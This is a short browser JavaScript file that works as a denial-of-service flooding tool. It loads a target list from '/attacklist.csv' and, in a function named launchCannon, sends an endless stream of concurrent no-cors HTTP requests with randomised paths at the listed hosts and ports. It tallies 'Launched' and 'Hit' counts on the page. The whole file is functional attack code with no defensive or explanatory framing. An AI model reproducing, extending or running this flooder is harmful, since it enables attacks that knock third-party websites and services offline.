(function () {
  var elements = {
    btn: document.getElementById("btnAction"),
    counter: document.getElementById("txtCounter"),
  };

  var counter = {
    total: 0,
    hit: 0,
  };

  var stats = {
    // TODO
  }

  function refreshCounter() {
    elements.counter.innerHTML = `Launched: <strong>${counter.total}</strong>, Hit: <strong>${counter.hit}</strong>`;
  }

  window.getTargets = function (cb) {
    fetch("/attacklist.csv").then((res) => {
      res.text().then((list) => {
        const targets = list
          .split("\n")
          .slice(1)
          .filter((i) => !!i)
          .map((i) => {
            const row = i.split(",");
            return {
              method: row[0],
              host: row[1],
              port: row[2],
              path: row[3],
            };
          });
        cb(targets);
      });
    });
  };

  const getMaxConcurrent = function () {
    return 10;
  }

  window.launchCannon = function (bytes, progressCb, done) {
    const maxConcurrent = getMaxConcurrent();

    getTargets(function (targets) {
      function fireRequests() {
        const target = targets[Math.floor(Math.random() * targets.length)];

        
        function fire() {
          var rand = Math.floor(Math.random() * 1000000) + new Date().getTime();

          counter.total++;
          refreshCounter();

          fetch(`https://${target.host}:${target.port}/${(target.path || '').replace('{rand}', rand)}`, {
            method: target.method || 'GET',
            mode: "no-cors",
          }).finally(function (err) {
            counter.hit++;
            refreshCounter();
            // TODO until done
            fire();
          });
        }

        for (let i = 0; i <= maxConcurrent; i++) {
          fire()
        }
      }

      fireRequests();
    });
  };
})();
